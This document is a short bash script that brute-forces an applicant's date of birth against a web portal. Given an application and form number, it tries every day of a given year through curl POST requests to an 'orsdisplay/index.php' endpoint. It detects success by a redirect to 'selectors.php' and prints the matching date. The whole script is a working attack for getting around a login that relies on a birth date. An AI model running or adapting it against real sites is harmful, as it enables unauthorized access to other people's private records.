#!/bin/bash
year=$1
appno=$2
formno=$3
#Get site_root in $4 as well
for month in {1..12}
do
    echo $month/$year - $appno - $formno
    for day in {1..31}
    do
        month_f=`printf "%02d" $month`
        day_f=`printf "%02d" $day`
        #echo $day_f/$month_f/$year
        curl -s -X POST -D- -d"appno=$appno&formno=$formno&DateOfBirth_Day=$day_f&DateOfBirth_Month=$month_f&DateOfBirth_Year=$year&submit=Submit"  "$4orsdisplay/index.php" -o/dev/null | grep selectors.php
        ret="$?"
        if [[ $ret -eq "0" ]]; then
            echo "$day_f/$month_f/$year"
            exit
        fi
    done
done
echo "NOT_FOUND"
